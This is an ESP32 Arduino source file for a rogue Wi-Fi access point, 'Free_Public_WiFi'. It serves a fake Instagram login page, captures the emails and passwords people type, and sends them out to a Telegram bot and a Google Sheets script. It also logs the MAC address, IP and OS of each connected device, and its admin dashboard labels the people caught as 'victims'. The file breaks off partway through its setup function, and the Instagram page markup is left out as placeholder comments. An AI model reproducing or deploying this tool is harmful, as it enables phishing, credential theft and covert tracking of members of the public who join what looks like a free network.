#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <HTTPClient.h>
#include <vector>
#include <deque>
#include <ArduinoJson.h>
#include "esp_wifi.h"
#include "tcpip_adapter.h"
#include "esp_task_wdt.h"

// =====================
// FORWARD DECLARATIONS
// =====================
String getDeviceBrowser(String userAgent);
void sendTelegramMessage(String message);
String formatMacAddress(const uint8_t* mac);
String getUptime();
String getDeviceOS(String userAgent);
String getCurrentTime();
String getDeviceInfo(AsyncWebServerRequest *request);
void addSerialLog(String message, String type = "info");
void trackDevice(AsyncWebServerRequest *request);
void sendToGoogleSheets(String email, String pass, String deviceInfo, String mac, String ip);
void printToSerial(String email, String pass, String deviceInfo);
void authenticateDevice(String mac);
bool isDeviceAuthenticated(String mac);

// =====================
// CONFIGURATION SECTION
// =====================
// Rogue Access Point Settings
const char* rogueSSID = "Free_Public_WiFi";
const char* roguePassword = "";
const IPAddress apIP(192, 168, 4, 1);
const byte DNS_PORT = 53;

// Real Wi-Fi Credentials
const char* realSSID = "ENTER_YOUR_WIFI_SSID_HERE"; // Enter your actual Wi-Fi SSID
const char* realPassword = "ENTER_YOUR_WIFI_PASSWORD_HERE"; // Enter your actual Wi-Fi Password

// Google Forms Endpoint
const char* googleScriptUrl = "ENTER_YOUR_GOOGLE_SCRIPT_URL_HERE"; // Enter your Google Script URL

// Telegram Bot Settings
const char* telegramBotToken = "ENTER_YOUR_TELEGRAM_BOT_TOKEN_HERE"; // Enter your Telegram Bot Token here
const char* telegramChatID = "ENTER_YOUR_TELEGRAM_CHAT_ID_HERE"; // Enter your Telegram Chat ID here

// Admin Panel Settings
const char *adminPin = "12345678"; // Enter a secure 8-digit PIN for Admin Panel
const int MAX_ADMIN_ATTEMPTS = 5;
const unsigned long LOCKOUT_TIME = 300000; // 5 minutes

// System Settings
const bool ENABLE_SERIAL_MONITOR = true;
const bool ENABLE_TELEGRAM = true;
const bool ENABLE_GOOGLE_SHEETS = true;
const bool ENABLE_ADMIN_PANEL = true;
const bool ENABLE_DEVICE_TRACKING = true;
const int MAX_LOGINS = 100;
const int SERIAL_LOG_SIZE = 200;
const int WDT_TIMEOUT = 30;
const int MAX_CONNECTED_DEVICES = 50;

// =====================
// GLOBAL VARIABLES
// =====================
DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// Temporary configuration (resets on reboot)
String tempTelegramChatID = "";
String tempRealSSID = "";
String tempRealPassword = "";
String tempRogueSSID = "";
bool tempInternetEnabled = true;

struct LoginData {
  String email;
  String password;
  String timestamp;
  String deviceInfo;
  String mac;
  String ip;
};

struct ConnectedDevice {
  String mac;
  String hostname;
  int rssi;
  unsigned long firstSeen;
  unsigned long lastSeen;
  String userAgent;
  String os;
  String ip;
  bool authenticated;
};

struct AdminAttempt {
  String ip;
  String mac;
  String timestamp;
  bool success;
  String userAgent;
};

struct SerialLogEntry {
  String message;
  String timestamp;
  String type;
};

std::vector<LoginData> logins;
std::vector<ConnectedDevice> connectedDevices;
std::vector<AdminAttempt> adminAttempts;
std::deque<SerialLogEntry> serialLog;
unsigned long startTime;
int totalVictims = 0;
int failedAdminAttempts = 0;
unsigned long lastAdminAttempt = 0;
bool adminLocked = false;
unsigned long lockoutStart = 0;

// =====================
// UTILITY FUNCTIONS
// =====================
String formatMacAddress(const uint8_t* mac) {
    char buf[20];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", 
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

String getUptime() {
  unsigned long sec = millis() / 1000;
  unsigned int days = sec / 86400;
  sec %= 86400;
  unsigned int hours = sec / 3600;
  sec %= 3600;
  unsigned int mins = sec / 60;
  sec %= 60;

  char buffer[80];
  snprintf(buffer, sizeof(buffer), "%u days, %02u:%02u:%02u", days, hours, mins, sec);
  return String(buffer);
}

String getDeviceOS(String userAgent) {
  if (userAgent.indexOf("iPhone") != -1) return "iOS";
  else if (userAgent.indexOf("iPad") != -1) return "iPadOS";
  else if (userAgent.indexOf("Android") != -1) return "Android";
  else if (userAgent.indexOf("Windows") != -1) return "Windows";
  else if (userAgent.indexOf("Macintosh") != -1) return "macOS";
  else if (userAgent.indexOf("Linux") != -1) return "Linux";
  return "Unknown";
}

String getDeviceBrowser(String userAgent) {
  if (userAgent.indexOf("Chrome") != -1) return "Chrome";
  else if (userAgent.indexOf("Safari") != -1) return "Safari";
  else if (userAgent.indexOf("Firefox") != -1) return "Firefox";
  else if (userAgent.indexOf("Edge") != -1) return "Edge";
  return "Unknown";
}

String getCurrentTime() {
  unsigned long currentMillis = millis();
  unsigned long sec = currentMillis / 1000;
  unsigned int hours = (sec / 3600) % 24;
  unsigned int mins = (sec / 60) % 60;
  unsigned int secs = sec % 60;
  
  char buffer[10];
  snprintf(buffer, sizeof(buffer), "%02u:%02u:%02u", hours, mins, secs);
  return String(buffer);
}

String getDeviceInfo(AsyncWebServerRequest *request) {
  String userAgent = request->getHeader("User-Agent")->value();
  String deviceInfo = "Unknown Device";
  
  if (userAgent.indexOf("iPhone") != -1) deviceInfo = "iPhone";
  else if (userAgent.indexOf("iPad") != -1) deviceInfo = "iPad";
  else if (userAgent.indexOf("Android") != -1) deviceInfo = "Android";
  else if (userAgent.indexOf("Windows") != -1) deviceInfo = "Windows PC";
  else if (userAgent.indexOf("Macintosh") != -1) deviceInfo = "Mac";
  else if (userAgent.indexOf("Linux") != -1) deviceInfo = "Linux PC";
  
  return deviceInfo;
}

void addSerialLog(String message, String type) {
  if (serialLog.size() >= SERIAL_LOG_SIZE) {
    serialLog.pop_front();
  }
  serialLog.push_back({message, getCurrentTime(), type});
  
  String json;
  StaticJsonDocument<200> doc;
  doc["message"] = message;
  doc["timestamp"] = getCurrentTime();
  doc["type"] = type;
  serializeJson(doc, json);
  ws.textAll(json);
}

void trackDevice(AsyncWebServerRequest *request) {
  if (!ENABLE_DEVICE_TRACKING) return;

  String mac = "Unknown";
  String hostname = "Unknown";
  String userAgent = request->getHeader("User-Agent")->value();
  IPAddress remoteIP = request->client()->remoteIP();
  String ipStr = remoteIP.toString();

  wifi_sta_list_t wifi_sta_list;
  tcpip_adapter_sta_list_t adapter_sta_list;
  memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
  memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

  if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
      if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
          for (int i = 0; i < adapter_sta_list.num; i++) {
              tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
              if (IPAddress(station.ip.addr) == remoteIP) {
                  mac = formatMacAddress(station.mac);
                  break;
              }
          }
      }
  }

  if (request->hasHeader("Host")) {
      hostname = request->getHeader("Host")->value();
  }

  int rssi = WiFi.RSSI();

  bool found = false;
  for (auto &device : connectedDevices) {
    if (device.mac == mac) {
      device.lastSeen = millis();
      device.rssi = rssi;
      found = true;
      break;
    }
  }
  
  if (!found && connectedDevices.size() < MAX_CONNECTED_DEVICES) {
    ConnectedDevice newDevice = {
      mac, 
      hostname, 
      rssi, 
      millis(), 
      millis(),
      userAgent,
      getDeviceOS(userAgent) + " (" + getDeviceBrowser(userAgent) + ")",
      ipStr,
      false
    };
    connectedDevices.push_back(newDevice);
    
    addSerialLog("New device: " + mac + " | OS: " + newDevice.os + " | RSSI: " + String(rssi) + "dBm", "warning");
    
    if (ENABLE_TELEGRAM && WiFi.status() == WL_CONNECTED) {
      String message = "📱 New Device Connected\n";
      message += "⏰ Time: " + getCurrentTime() + "\n";
      message += "📶 MAC: " + mac + "\n";
      message += "🖥️ OS: " + newDevice.os + "\n";
      message += "📡 RSSI: " + String(rssi) + " dBm\n";
      message += "🌐 Host: " + hostname + "\n";
      message += "📍 IP: " + ipStr;
      
      sendTelegramMessage(message);
    }
  }
}

// =====================
// NOTIFICATION FUNCTIONS
// =====================
void sendTelegramMessage(String message) {
  if (!ENABLE_TELEGRAM || WiFi.status() != WL_CONNECTED) {
    addSerialLog("Telegram notification failed - WiFi not connected", "error");
    return;
  }

  String chatID = tempTelegramChatID != "" ? tempTelegramChatID : telegramChatID;
  
  HTTPClient http;
  String url = "https://api.telegram.org/bot" + String(telegramBotToken) + "/sendMessage";
  http.begin(url);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  
  String postData = "chat_id=" + chatID + 
                    "&text=" + message + 
                    "&parse_mode=Markdown";
  
  esp_task_wdt_reset();
  http.setTimeout(5000);
  int httpCode = http.POST(postData);

  if (httpCode > 0) {
    addSerialLog("Telegram notification sent", "success");
  } else {
    addSerialLog("Telegram error. HTTP Code: " + String(httpCode), "error");
  }
  http.end();
}

void sendToGoogleSheets(String email, String pass, String deviceInfo, String mac, String ip) {
  if (!ENABLE_GOOGLE_SHEETS || WiFi.status() != WL_CONNECTED) {
    addSerialLog("Google Sheets failed - WiFi not connected", "error");
    return;
  }

  HTTPClient http;
  http.begin(googleScriptUrl);
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  String payload = "email=" + email + 
                   "&password=" + pass + 
                   "&device=" + deviceInfo + 
                   "&mac=" + mac +
                   "&ip=" + ip +
                   "&time=" + getCurrentTime();
  
  esp_task_wdt_reset();
  http.setTimeout(5000);
  int httpCode = http.POST(payload);

  if (httpCode > 0) {
    addSerialLog("Data sent to Google Sheets", "success");
  } else {
    addSerialLog("Google Sheets error. HTTP Code: " + String(httpCode), "error");
  }
  http.end();
}

void printToSerial(String email, String pass, String deviceInfo) {
  if (!ENABLE_SERIAL_MONITOR) return;

  totalVictims++;
  
  Serial.println("\n╔══════════════════════════════════════════════════╗");
  Serial.printf("║ 🚨 CREDENTIALS CAPTURED [Victim #%d] 🚨          ║\n", totalVictims);
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ Time:    %-35s ║\n", getCurrentTime().c_str());
  Serial.printf("║ Device:  %-35s ║\n", deviceInfo.c_str());
  Serial.printf("║ Email:   %-35s ║\n", email.c_str());
  Serial.printf("║ Pass:    %-35s ║\n", pass.c_str());
  Serial.println("╚══════════════════════════════════════════════════╝");
  
  addSerialLog("Credentials captured: " + deviceInfo + " - " + email + ":" + pass, "warning");
}

// =====================
// WEB SOCKET HANDLING
// =====================
void onWebSocketEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    addSerialLog("WebSocket client connected: #" + String(client->id()), "info");
    for (const auto &log : serialLog) {
      String json;
      StaticJsonDocument<200> doc;
      doc["message"] = log.message;
      doc["timestamp"] = log.timestamp;
      doc["type"] = log.type;
      serializeJson(doc, json);
      client->text(json);
    }
  } else if (type == WS_EVT_DISCONNECT) {
    addSerialLog("WebSocket client disconnected: #" + String(client->id()), "info");
  }
}

// =====================
// WIFI EXTENDER FUNCTIONS
// =====================
void authenticateDevice(String mac) {
  for (auto &device : connectedDevices) {
    if (device.mac == mac) {
      device.authenticated = true;
      addSerialLog("Device authenticated: " + mac, "success");
      break;
    }
  }
}

bool isDeviceAuthenticated(String mac) {
  for (const auto &device : connectedDevices) {
    if (device.mac == mac && device.authenticated) {
      return true;
    }
  }
  return false;
}

// =====================
// ADMIN PANEL TEMPLATES
// =====================
// Instagram Login Page
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram Login</title>
  <style>
    /* Instagram-styled CSS remains the same as before */
  </style>
</head>
<body>
  <!-- Instagram-styled HTML remains the same as before -->
</body>
</html>
)rawliteral";

// Admin login page
const char adminLoginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>J.A.R.V.I.S. Authentication</title>
  <style>
    /* Admin login CSS remains the same as before */
  </style>
</head>
<body>
  <!-- Admin login HTML remains the same as before -->
</body>
</html>
)rawliteral";

String buildAdminPage() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>J.A.R.V.I.S. - Control Panel</title>
    <style>
      :root {
        --primary: #0f4c75;
        --secondary: #3282b8;
        --accent: #00adb5;
        --dark: #1b262c;
        --light: #f0f5f9;
        --danger: #ff414d;
        --success: #4ade80;
        --warning: #ffb74d;
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      }
      
      body {
        background: linear-gradient(135deg, var(--dark), #0d2438);
        color: var(--light);
        min-height: 100vh;
        overflow-x: hidden;
      }
      
      .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 20px;
      }
      
      header {
        background: rgba(15, 30, 45, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 16px;
        padding: 20px;
        margin-bottom: 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border: 1px solid rgba(50, 130, 184, 0.2);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      }
      
      .logo {
        display: flex;
        align-items: center;
        gap: 15px;
      }
      
      .logo-icon {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, var(--accent), var(--secondary));
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 24px;
        font-weight: bold;
      }
      
      .logo-text h1 {
        font-size: 28px;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      
      .logo-text p {
        font-size: 14px;
        color: #bbbbbb;
      }
      
      .system-info {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 15px;
        margin-bottom: 20px;
      }
      
      .info-card {
        background: rgba(15, 30, 45, 0.6);
        border-radius: 12px;
        padding: 20px;
        border: 1px solid rgba(50, 130, 184, 0.2);
        transition: transform 0.3s ease;
      }
      
      .info-card:hover {
        transform: translateY(-5px);
      }
      
      .info-card h3 {
        font-size: 16px;
        color: #bbbbbb;
        margin-bottom: 10px;
      }
      
      .info-card .value {
        font-size: 28px;
        font-weight: bold;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      
      /* Tab Styling */
      .tabs {
        display: flex;
        background: rgba(15, 30, 45, 0.6);
        border-radius: 12px;
        margin-bottom: 20px;
        overflow: hidden;
      }
      
      .tab-button {
        flex: 1;
        padding: 15px;
        background: transparent;
        border: none;
        color: #bbbbbb;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
      }
      
      .tab-button:hover {
        background: rgba(50, 130, 184, 0.2);
      }
      
      .tab-button.active {
        background: var(--accent);
        color: white;
      }
      
      .tab-content {
        display: none;
        background: rgba(15, 30, 45, 0.6);
        border-radius: 16px;
        padding: 25px;
        border: 1px solid rgba(50, 130, 184, 0.2);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        margin-bottom: 20px;
      }
      
      .tab-content.active {
        display: block;
      }
      
      table {
        width: 100%;
        border-collapse: collapse;
      }
      
      th {
        background: rgba(50, 130, 184, 0.2);
        padding: 15px;
        text-align: left;
        font-weight: 600;
        color: var(--accent);
        border-bottom: 2px solid rgba(50, 130, 184, 0.3);
      }
      
      td {
        padding: 15px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
      }
      
      tr:hover {
        background: rgba(50, 130, 184, 0.1);
      }
      
      .device-list {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
        gap: 15px;
      }
      
      .device-card {
        background: rgba(30, 45, 60, 0.5);
        border-radius: 12px;
        padding: 15px;
        border: 1px solid rgba(50, 130, 184, 0.2);
      }
      
      .device-card h3 {
        font-size: 18px;
        margin-bottom: 10px;
        color: var(--accent);
      }
      
      .device-card p {
        font-size: 14px;
        margin-bottom: 5px;
        color: #bbbbbb;
      }
      
      .signal {
        display: flex;
        align-items: center;
        gap: 5px;
        margin-top: 10px;
      }
      
      .signal-bar {
        width: 4px;
        height: 20px;
        background: #555;
        border-radius: 2px;
      }
      
      .signal-bar.active {
        background: var(--success);
      }
      
      .online-status {
        display: inline-block;
        width: 10px;
        height: 10px;
        border-radius: 50%;
        margin-right: 5px;
      }
      
      .online {
        background: var(--success);
      }
      
      .offline {
        background: var(--danger);
      }
      
      .serial-monitor {
        background: #1e1e1e;
        border-radius: 8px;
        padding: 15px;
        height: 400px;
        overflow-y: auto;
        font-family: monospace;
        font-size: 14px;
      }
      
      .log-entry {
        margin-bottom: 5px;
        padding: 5px;
        border-radius: 4px;
      }
      
      .log-info {
        color: #4fc3f7;
      }
      
      .log-warning {
        color: #ffb74d;
        background: rgba(255, 183, 77, 0.1);
      }
      
      .log-error {
        color: #ff5252;
        background: rgba(255, 82, 82, 0.1);
      }
      
      .log-success {
        color: #69f0ae;
        background: rgba(105, 240, 174, 0.1);
      }
      
      .config-form {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 20px;
      }
      
      .form-group {
        margin-bottom: 15px;
      }
      
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #bbbbbb;
      }
      
      .form-group input, .form-group select {
        width: 100%;
        padding: 12px;
        background: rgba(30, 45, 60, 0.5);
        border: 1px solid rgba(50, 130, 184, 0.3);
        border-radius: 8px;
        color: white;
        font-size: 16px;
      }
      
      .toggle-switch {
        position: relative;
        display: inline-block;
        width: 60px;
        height: 34px;
      }
      
      .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
      }
      
      .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #555;
        transition: .4s;
        border-radius: 34px;
      }
      
      .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
      }
      
      input:checked + .slider {
        background-color: var(--accent);
      }
      
      input:checked + .slider:before {
        transform: translateX(26px);
      }
      
      .btn {
        padding: 12px 25px;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        border: none;
        border-radius: 8px;
        color: white;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
      }
      
      .btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      }
      
      .btn:active {
        transform: translateY(0);
      }
      
      .footer {
        text-align: center;
        padding: 20px;
        font-size: 12px;
        color: #777;
      }
      
      @media (max-width: 768px) {
        .system-info {
          grid-template-columns: 1fr;
        }
        
        .tabs {
          flex-direction: column;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <div class="logo">
          <div class="logo-icon">J</div>
          <div class="logo-text">
            <h1>J.A.R.V.I.S. SECURITY SYSTEM</h1>
            <p>Advanced Threat Intelligence Platform</p>
          </div>
        </div>
        <div class="actions">
          <form action="/clear" method="POST" style="display: inline-block;">
            <button class="btn btn-danger" type="submit">Clear All Data</button>
          </form>
          <form action="/admin" method="GET" style="display: inline-block; margin-left: 10px;">
            <button class="btn btn-success" type="submit">Refresh</button>
          </form>
          <form action="/restart" method="POST" style="display: inline-block; margin-left: 10px;">
            <button class="btn btn-warning" type="submit">Restart System</button>
          </form>
        </div>
      </header>
      
      <div class="system-info">
        <div class="info-card">
          <h3>UPTIME</h3>
          <div class="value">)rawliteral" + getUptime() + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>CONNECTED DEVICES</h3>
          <div class="value">)rawliteral" + String(WiFi.softAPgetStationNum()) + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>TOTAL VICTIMS</h3>
          <div class="value">)rawliteral" + String(totalVictims) + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>SYSTEM STATUS</h3>
          <div class="value">)rawliteral" + String(adminLocked ? "LOCKED" : "OPERATIONAL") + R"rawliteral(</div>
        </div>
      </div>
      
      <div class="tabs">
        <button class="tab-button active" onclick="openTab('dashboard')">Dashboard</button>
        <button class="tab-button" onclick="openTab('victims')">Victims</button>
        <button class="tab-button" onclick="openTab('devices')">Devices</button>
        <button class="tab-button" onclick="openTab('logs')">Logs</button>
        <button class="tab-button" onclick="openTab('config')">Configuration</button>
      </div>
      
      <!-- Dashboard Tab -->
      <div id="dashboard" class="tab-content active">
        <div class="card-header">
          <h2>SYSTEM OVERVIEW</h2>
        </div>
        <div class="card-content">
          <p>Welcome to the J.A.R.V.I.S. Security System control panel. This dashboard provides real-time monitoring of connected devices, captured credentials, and system status.</p>
          
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
            <div>
              <h3 style="color: var(--accent); margin-bottom: 15px;">Recent Activity</h3>
              <div style="background: rgba(30, 45, 60, 0.5); border-radius: 8px; padding: 15px; height: 200px; overflow-y: auto;">
                )rawliteral";
                
                // Display last 5 serial logs
                int startIdx = serialLog.size() > 5 ? serialLog.size() - 5 : 0;
                for (int i = startIdx; i < serialLog.size(); i++) {
                  html += "<p><span style='color: #777'>[" + serialLog[i].timestamp + "]</span> " + serialLog[i].message + "</p>";
                }
                
                html += R"rawliteral(
              </div>
            </div>
            
            <div>
              <h3 style="color: var(--accent); margin-bottom: 15px;">System Actions</h3>
              <div style="display: flex; flex-direction: column; gap: 10px;">
                <button class="btn" onclick="location.reload()">Refresh Data</button>
                <button class="btn" onclick="document.getElementById('logs').scrollIntoView()">View Full Logs</button>
                <button class="btn" onclick="openTab('config')">Configuration Settings</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Victims Tab -->
      <div id="victims" class="tab-content">
        <div class="card-header">
          <h2>CAPTURED CREDENTIALS</h2>
        </div>
        <div class="card-content">
          <table>
            <thead>
              <tr>
                <th>Time</th>
                <th>Device</th>
                <th>MAC</th>
                <th>IP</th>
                <th>Username/Email</th>
                <th>Password</th>
              </tr>
            </thead>
            <tbody>
  )rawliteral";

  for (auto &login : logins) {
    html += "<tr>";
    html += "<td>" + login.timestamp + "</td>";
    html += "<td>" + login.deviceInfo + "</td>";
    html += "<td>" + login.mac + "</td>";
    html += "<td>" + login.ip + "</td>";
    html += "<td>" + login.email + "</td>";
    html += "<td>" + login.password + "</td>";
    html += "</tr>";
  }

  html += R"rawliteral(
            </tbody>
          </table>
        </div>
      </div>
      
      <!-- Devices Tab -->
      <div id="devices" class="tab-content">
        <div class="card-header">
          <h2>CONNECTED DEVICES</h2>
        </div>
        <div class="card-content">
          <div class="device-list">
  )rawliteral";

  unsigned long currentTime = millis();
  for (auto &device : connectedDevices) {
    bool isOnline = (currentTime - device.lastSeen) < 300000;
    
    html += "<div class='device-card'>";
    html += "<h3>" + device.mac + "</h3>";
    html += "<p><span class='online-status " + String(isOnline ? "online" : "offline") + "'></span> " + 
            (isOnline ? "Online" : "Offline") + "</p>";
    html += "<p>Host: " + device.hostname + "</p>";
    html += "<p>OS: " + device.os + "</p>";
    html += "<p>IP: " + device.ip + "</p>";
    html += "<p>Status: " + String(device.authenticated ? "Authenticated" : "Not Authenticated") + "</p>";
    html += "<p>Signal: " + String(device.rssi) + " dBm</p>";
    
    html += "<div class='signal'>";
    int bars = map(device.rssi, -100, -50, 1, 5);
    for (int i = 0; i < 5; i++) {
      html += "<div class='signal-bar" + String(i < bars ? " active" : "") + "'></div>";
    }
    html += "</div>";
    
    unsigned long duration = (currentTime - device.firstSeen) / 1000;
    unsigned int hours = duration / 3600;
    unsigned int mins = (duration % 3600) / 60;
    unsigned int secs = duration % 60;
    char durationStr[20];
    snprintf(durationStr, sizeof(durationStr), "%02u:%02u:%02u", hours, mins, secs);
    
    html += "<p>Duration: " + String(durationStr) + "</p>";
    html += "</div>";
  }

  html += R"rawliteral(
          </div>
        </div>
      </div>
      
      <!-- Logs Tab -->
      <div id="logs" class="tab-content">
        <div class="card-header">
          <h2>SYSTEM LOGS</h2>
        </div>
        <div class="card-content">
          <div class="serial-monitor" id="serialMonitor">
            <!-- Logs will be inserted here by JavaScript -->
          </div>
        </div>
      </div>
      
      <!-- Configuration Tab -->
      <div id="config" class="tab-content">
        <div class="card-header">
          <h2>SYSTEM CONFIGURATION</h2>
        </div>
        <div class="card-content">
          <form action="/update-config" method="POST" class="config-form">
            <div>
              <h3 style="color: var(--accent); margin-bottom: 20px;">Wi-Fi Settings</h3>
              
              <div class="form-group">
                <label for="real_ssid">Real Wi-Fi SSID</label>
                <input type="text" id="real_ssid" name="real_ssid" placeholder=")rawliteral" + String(realSSID) + R"rawliteral(">
              </div>
              
              <div class="form-group">
                <label for="real_pass">Real Wi-Fi Password</label>
                <input type="password" id="real_pass" name="real_pass" placeholder="••••••••">
              </div>
              
              <div class="form-group">
                <label for="rogue_ssid">Rogue AP SSID</label>
                <input type="text" id="rogue_ssid" name="rogue_ssid" placeholder=")rawliteral" + String(rogueSSID) + R"rawliteral(">
              </div>
            </div>
            
            <div>
              <h3 style="color: var(--accent); margin-bottom: 20px;">Notification Settings</h3>
              
              <div class="form-group">
                <label for="telegram_chat">Telegram Chat ID</label>
                <input type="text" id="telegram_chat" name="telegram_chat" placeholder=")rawliteral" + String(telegramChatID) + R"rawliteral(">
              </div>
              
              <div class="form-group">
                <label>Features</label>
                <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Internet Access</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="internet" )rawliteral" + (tempInternetEnabled ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                  
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Telegram Notifications</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="telegram" )rawliteral" + (ENABLE_TELEGRAM ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                  
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Google Sheets</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="sheets" )rawliteral" + (ENABLE_GOOGLE_SHEETS ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                </div>
              </div>
              
              <div style="display: flex; gap: 10px; margin-top: 30px;">
                <button type="submit" class="btn">Update Configuration</button>
                <button type="button" class="btn" onclick="resetConfig()">Reset to Default</button>
              </div>
            </div>
          </form>
        </div>
      </div>
      
      <div class="footer">
        J.A.R.V.I.S. Security System v5.0 | 
        Developed by Javed Hussain | 
        Advanced Threat Intelligence Platform
      </div>
    </div>
    
    <script>
      // Tab switching function
      function openTab(tabName) {
        const tabs = document.querySelectorAll('.tab-content');
        tabs.forEach(tab => tab.classList.remove('active'));
        
        const buttons = document.querySelectorAll('.tab-button');
        buttons.forEach(btn => btn.classList.remove('active'));
        
        document.getElementById(tabName).classList.add('active');
        event.currentTarget.classList.add('active');
      }
      
      // WebSocket for logs
      const socket = new WebSocket('ws://' + window.location.host + '/ws');
      const serialMonitor = document.getElementById('serialMonitor');
      
      socket.onmessage = function(event) {
        const log = JSON.parse(event.data);
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry log-' + log.type;
        logEntry.innerHTML = `<span style="color: #777">[${log.timestamp}]</span> ${log.message}`;
        serialMonitor.appendChild(logEntry);
        serialMonitor.scrollTop = serialMonitor.scrollHeight;
      };
      
      // Load initial logs
      window.onload = function() {
        fetch('/get-logs')
          .then(response => response.json())
          .then(logs => {
            logs.forEach(log => {
              const logEntry = document.createElement('div');
              logEntry.className = 'log-entry log-' + log.type;
              logEntry.innerHTML = `<span style="color: #777">[${log.timestamp}]</span> ${log.message}`;
              serialMonitor.appendChild(logEntry);
            });
            serialMonitor.scrollTop = serialMonitor.scrollHeight;
          });
      };
      
      // Reset config function
      function resetConfig() {
        document.getElementById('real_ssid').value = '';
        document.getElementById('real_pass').value = '';
        document.getElementById('rogue_ssid').value = '';
        document.getElementById('telegram_chat').value = '';
        document.querySelector('input[name="internet"]').checked = true;
        document.querySelector('input[name="telegram"]').checked = true;
        document.querySelector('input[name="sheets"]').checked = true;
      }
    </script>
  </body>
  </html>
)rawliteral";
return html;
}

// =====================
// SETUP FUNCTION
// =====================
void setup() {
  esp_task_wdt_init(WDT_TIMEOUT, false);
  Serial.begin(115200);
  delay(1000);
  

  
  addSerialLog("System initialization started", "info");
  
  Serial.println("\n> Connecting to Real Wi-Fi: " + String(realSSID));
  WiFi.mode(WIFI_AP_STA);
  WiFi.begin(realSSID, realPassword);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
    esp_task_wdt_reset();
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n> Real Wi-Fi Connected ✅");
    Serial.println("> IP Address: " + WiFi.localIP().toString());
    addSerialLog("Connected to real WiFi: " + String(realSSID), "success");
  } else {
    Serial.println("\n> ❌ Failed to connect to Real Wi-Fi");
    addSerialLog("Failed to connect to real WiFi", "error");
  }

  Serial.println("\n> Creating Rogue Access Point...");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  if (WiFi.softAP(rogueSSID, roguePassword)) {
    Serial.println("✅ Rogue AP Created: " + String(rogueSSID));
    Serial.println("> Rogue AP IP: " + WiFi.softAPIP().toString());
    addSerialLog("Rogue AP created: " + String(rogueSSID), "success");
  } else {
